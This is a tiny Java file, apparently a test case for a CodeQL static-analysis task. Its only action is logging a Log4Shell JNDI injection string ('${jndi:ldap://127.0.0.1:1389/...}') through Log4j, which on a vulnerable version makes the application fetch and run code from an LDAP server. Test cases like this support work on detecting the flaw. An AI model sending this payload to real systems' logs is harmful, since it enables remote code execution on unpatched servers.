package codeql_task;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;

public class CodeQLTaskOne {
    public static void main(String[] args) {
        String poc = "${jndi:ldap://127.0.0.1:1389/udrlwt}";
        Logger logger = LogManager.getLogger(CodeQLTaskOne.class);
        logger.error(poc);
    }
}

